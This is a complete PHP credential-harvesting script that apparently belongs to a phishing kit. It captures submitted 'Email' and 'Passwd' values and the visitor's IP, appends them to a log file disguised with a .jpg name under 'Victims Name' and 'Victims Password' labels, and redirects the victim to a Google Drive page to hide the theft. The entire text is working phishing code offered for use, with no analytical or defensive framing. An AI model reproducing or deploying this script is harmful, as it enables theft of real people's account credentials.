<?php
$email = $_POST['Email']; 
$password = $_POST['Passwd'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("AAC189092019881999191919191mobeen.jpg", "a"); 
fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$email.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.fb.com/mobeendotcom" rel="nofollow">Bee Hay</a></font></b>]<br>');
fclose($f);
header('Location:https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view');
?>
